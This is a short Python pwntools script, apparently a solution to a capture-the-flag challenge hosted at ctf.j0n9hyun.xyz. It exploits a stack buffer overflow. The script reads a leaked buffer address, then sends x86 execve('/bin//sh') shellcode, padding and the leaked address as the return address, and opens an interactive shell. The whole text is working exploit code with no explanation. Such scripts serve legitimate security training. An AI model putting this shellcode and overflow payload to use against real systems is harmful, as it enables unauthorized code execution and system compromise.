from pwn import *
r = remote("ctf.j0n9hyun.xyz",3006)
sr = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"#23
print r.recvuntil(": ")

r.sendline("asdf")

addr = int(r.recv(10),16)
log.info("buffer : %#x",addr)
print r.recvuntil("(y/n): ")
r.sendline("y")
print r.recvuntil(":")

payload = sr
payload += "a"*117
payload += p32(addr)

r.send(payload)

r.interactive()
